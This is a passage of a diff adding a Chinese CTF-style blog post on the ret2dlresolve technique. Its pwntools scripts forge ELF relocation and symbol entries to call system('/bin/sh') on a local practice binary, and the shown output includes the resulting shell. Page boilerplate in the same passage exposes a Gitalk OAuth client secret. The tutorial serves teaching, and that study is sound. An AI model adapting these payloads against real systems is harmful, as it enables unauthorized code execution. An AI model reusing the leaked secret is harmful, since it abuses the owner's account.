+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> 
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> fake_reloc <span class="token comment" spellcheck="true">#(at the base_stage+28)</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span>align
+payload2 <span class="token operator">+=</span> fake_sym <span class="token comment" spellcheck="true">#(base_stage+36)</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(r)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果：再次成功</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49247
+Welcome to the Crazy World<span class="token operator">!</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
+$  </code></pre>
+<h3 id="step5："><a href="#step5：" class="headerlink" title="step5："></a>step5：</h3><p>控制st_name指向字符串‘write’’</p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>
+
+plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>
+rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>
+index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>
+write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+dynsym <span class="token operator">=</span> <span class="token number">0x80481cc</span>
+dynstr <span class="token operator">=</span> <span class="token number">0x804826c</span>
+fake_sym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span> <span class="token comment" spellcheck="true">#(fake_reloc takes 16 bytes)</span>
+align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for the balance</span>
+fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align
+index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> 
+r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>
+fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>
+st_name <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">-</span> dynstr <span class="token comment" spellcheck="true">#this 0x10 for the sizeof fake_sym_addr</span>
+fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>
+
+payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> 
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> fake_reloc <span class="token comment" spellcheck="true">#(at the base_stage+28)</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span>align
+payload2 <span class="token operator">+=</span> fake_sym <span class="token comment" spellcheck="true">#(base_stage+36)</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'write\x00'</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(r)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果：成功调用并打印</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49302
+Welcome to the Crazy World<span class="token operator">!</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+/bin/sh<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
+$  </code></pre>
+<h3 id="step6"><a href="#step6" class="headerlink" title="step6:"></a>step6:</h3><p>替换write为system，并修改对应bss中的参数</p>
+<pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>
+
+plt_0 <span class="token operator">=</span> <span class="token number">0x8048370</span> <span class="token comment" spellcheck="true">#using objdump -d -j .plt test2</span>
+rel_plt <span class="token operator">=</span> <span class="token number">0x8048324</span> <span class="token comment" spellcheck="true">#readelf -d test2</span>
+index_offset <span class="token operator">=</span> <span class="token punctuation">(</span>base_stage <span class="token operator">+</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">-</span> rel_plt <span class="token comment" spellcheck="true">#off+rel.plt_addr ==>  base_stage+28</span>
+write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
+dynsym <span class="token operator">=</span> <span class="token number">0x80481cc</span>
+dynstr <span class="token operator">=</span> <span class="token number">0x804826c</span>
+fake_sym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">36</span> <span class="token comment" spellcheck="true">#(fake_reloc takes 16 bytes)</span>
+align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#for the balance</span>
+fake_sym_addr <span class="token operator">=</span> fake_sym_addr <span class="token operator">+</span> align
+index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> 
+r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>
+fake_reloc <span class="token operator">=</span> p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>
+st_name <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">-</span> dynstr <span class="token comment" spellcheck="true">#this 0x10 for the sizeof fake_sym_addr</span>
+fake_sym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span>
+
+payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#push linkmap</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rel.plt offset</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>
+payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> 
+payload2 <span class="token operator">+=</span> <span class="token string">'aaaa'</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'aaaa'</span>
+payload2 <span class="token operator">+=</span> fake_reloc <span class="token comment" spellcheck="true">#(at the base_stage+28)</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span>align
+payload2 <span class="token operator">+=</span> fake_sym <span class="token comment" spellcheck="true">#(base_stage+36)</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'system\x00'</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span class="token comment" spellcheck="true">#locate base_stage+80</span>
+payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(r)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>结果：获得shell</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/Freebuf/test2'</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./test2'</span><span class="token keyword">:</span> pid 49341
+Welcome to the Crazy World<span class="token operator">!</span>
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+$ <span class="token function">whoami</span>
+hunter
+$  </code></pre>
+<p>for more details ：<a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a></p>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/2.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/08/17/ret2dlresolve/" class="b-link-green">Ret2dlresolve</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'aa0bf75cc88de6c0258a',
+        clientSecret: '8ddc9bf71af314ac63d189a5ecb132fac7c0687d',
+        repo: 'Gitalks.github.io',
+        owner: 'squarepants0',
+        admin: "squarepants0",
+        id: '2020-08-17T15-47-22',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/08/17/ret2dlresolve/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Ret2dlresolve">
+                        
+                        <span class="card-title">Ret2dlresolve</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">延迟绑定技术因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-08-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-user fa-fw"></i>
+                            IT YUAN
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
+                        <span class="chip bg-color">原理学习</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/07/21/xctf-challenge-pwn100/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="XCTF-CHALLENGE-PWN100">
+                        
+                        <span class="card-title">XCTF-CHALLENGE-PWN100</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">1：checksechunter@hunter:~/PWN/XCTF/xctf_challenge/pwn100$ checksec babystack
+[*] '/home/hunter/PWN/XCTF/xctf_challenge/p</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
+                                    CTF-PWN
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/xctf-pwn-challenge/" target="_blank">
+                        <span class="chip bg-color">xctf-pwn-challenge</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('10')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Matrix<br />'
+            + '作者: IT YUAN<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者Matrix所有，任何形式的转载都请注明出处：https://squarepants0.github.io/。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">38.3k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2337463603@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2334763603" target="_blank" rel="noopener" class="tooltipped" data-tooltip="QQ联系我: 2334763603" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input" autofocus="">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+</body>
+</html>
